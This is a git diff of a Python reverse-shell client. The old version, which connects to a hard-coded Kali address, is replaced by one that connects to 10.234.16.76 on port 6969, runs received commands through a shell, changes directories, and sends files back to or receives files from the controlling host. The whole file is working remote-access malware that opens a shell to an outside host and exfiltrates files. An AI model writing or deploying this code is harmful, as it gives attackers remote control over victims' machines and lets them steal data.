@@ -1,25 +1,63 @@
 import socket
 import subprocess
+import json
+import os
+from subprocess import PIPE
 
-# Change HOST to Kali's IP
-HOST = '192.168.2.76'
-PORT = 9999
+sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sc.connect(('10.234.16.76', 6969))
 
-client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client.connect((HOST, PORT))
+def menerima_perintah():
+	data = ''
+	while True:
+		try:
+			data = data + sc.recv(1024).decode().rstrip()
+			return json.loads(data)
+		except ValueError:
+			continue
 
-while True:
-    command = client.recv(1024).decode()
-    if command.lower() == "exit":
-        break
-    if command.strip() == "":
-        continue
-    try:
-        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
-    except subprocess.CalledProcessError as e:
-        output = e.output
-    if not output:
-        output = b"Command executed with no output."
-    client.send(output)
+def upload_file(namafile):
+	file = open(namafile, 'rb')
+	sc.send(file.read())
+	file.close()
 
-client.close()
+def download_file(namafile):
+	file = open(namafile, 'wb')
+	sc.settimeout(1)
+	_file = sc.recv(1024)
+	while _file:
+		file.write(_file)
+		try:
+			_file = sc.recv(1024)
+		except socket.timeout as e:
+			break
+	sc.settimeout(None)
+	file.close()
+
+def jalankan_perintah():
+	while True:
+		perintah = menerima_perintah()
+		if perintah in ('exit','quit'):
+			break
+		elif perintah == 'clear':
+			pass
+		elif perintah[:3] == 'cd ':
+			os.chdir(perintah[3:])
+		elif perintah[:8] == 'download':
+			upload_file(perintah[9:])
+		elif perintah[:6] == 'upload':
+			download_file(perintah[7:])
+		else:
+			execute = subprocess.Popen(
+									perintah,
+									shell = True,
+									stdout = PIPE,
+									stderr = PIPE,
+									stdin = PIPE
+							)
+			data = execute.stdout.read() + execute.stderr.read()
+			data = data.decode()
+			output = json.dumps(data)
+			sc.send(output.encode())
+
+jalankan_perintah()
